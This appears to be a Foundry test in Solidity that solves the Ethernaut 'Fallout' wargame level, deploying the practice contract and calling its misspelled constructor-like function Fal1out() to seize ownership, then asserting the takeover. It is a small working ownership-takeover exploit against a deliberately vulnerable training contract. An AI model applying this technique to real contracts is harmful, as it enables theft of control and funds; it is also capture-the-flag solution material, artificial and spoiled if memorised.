// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/02_Fallout.sol";

contract AttackerFalloutTest is Test {
    function testFallout() external {
        vm.prank(address(0x1));
        Fallout fallout = new Fallout();

        assertFalse(fallout.owner() == address(this));
        fallout.Fal1out();
        assertTrue(fallout.owner() == address(this));
    }
}
